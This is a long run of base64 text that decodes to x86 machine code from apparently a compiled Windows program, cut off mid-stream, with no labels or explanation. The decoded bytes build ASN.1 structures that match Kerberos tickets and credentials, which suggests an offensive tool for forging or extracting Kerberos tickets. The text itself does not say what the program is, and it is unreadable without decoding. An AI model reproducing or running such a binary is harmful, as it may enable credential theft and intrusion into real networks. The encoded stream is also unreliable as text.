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EQiUX8hcB0U4sei0UMiwBTUP91/OiQsAAAi0X8A8ODxAyJOIX/dhmLTQiDwASLEYkQi1EEiVAEg8EIg8AIT3Xti0UM/zD/FexhARCLRfyLTQyJAYtF+AEGM9tDX4vDW8nDVYvsUVGLRQgPtkABiw6NBIUIAAAAU4lF/IPABFcDyFFqQDPbiUX4/xXoYQEQi/iF/3RDix6LRQyLAFNQV+gGsAAAi00ID7ZRAf91/I0EO4kQUYPABFDo7a8AAItFDIPEGP8w/xXsYQEQi0UMiTiLRfgBBjPbQ1+Lw1vJw1WL7IHsAAEAADPAiUX0iUX8iUX4iYUM////U1ZXi30IiweJhRT///+LRwSJhRj///+LRwiJhRz///+LRwyJhSD///+LRxCJhST///+LRxSJhSj///+LRxiJhSz///+LRxyJhTD///+LRyCJhTT///+LRySJhTj///+LRyiJhTz///+LRyxqCFmJhUD///+NRfxQjYVE////aAQAAgBQjXcwjV34xoUA////AcaFAf///xBmiY0C////x4UE////zMzMzMeFEP///wAAAgDogv3//41F/FCNhUz///9oCAACAFCNdzjoav3//41F/FCNhVT///9oDAACAFCNd0DoUv3//41F/FCNhVz///9oEAACAFCNd0joOv3//41F/FCNhWT///9oFAACAFCNd1DoIv3//41F/FBoGAACAI2FbP///1CNd1joCv3//2aLR2BmiYV0////ZotHYmaJhXb///+LR2SJhXj///+LR2iDxEiNTfxR/3dwiYV8////i0dsi/OJRYDHRYQcAAIA6HL9//+LR3SNd3iJRYiNfYylpaWNRfxQpYt9CI1FnGggAAIAUI23iAAAAOiZ/P//jUX8UI1FpGgkAAIAUI23kAAAAOiB/P//jUX8UP+3mAAAAIvzx0WsKAACAOiZ/f//i4ecAAAAiUWwi4egAAAAi134iUW0i4ekAAAAiUW4i4eoAAAAi00QiUW8i4esAAAAiUXAi4ewAAAAiUXEi4e0AAAAiUXIi4e4AAAAiUXMi4e8AAAAiUXQi4fAAAAAiUXUjYPcAAAAg8QoM/aJhQj///+Ng+wAAACJddiJddyJdeCJdeSJdeiJAVBqQP8V6GEBEItNDIkBO8Z0KGo7WVP/dfyL+AXsAAAAjbUA////UPOl6CutAACDxAzHRf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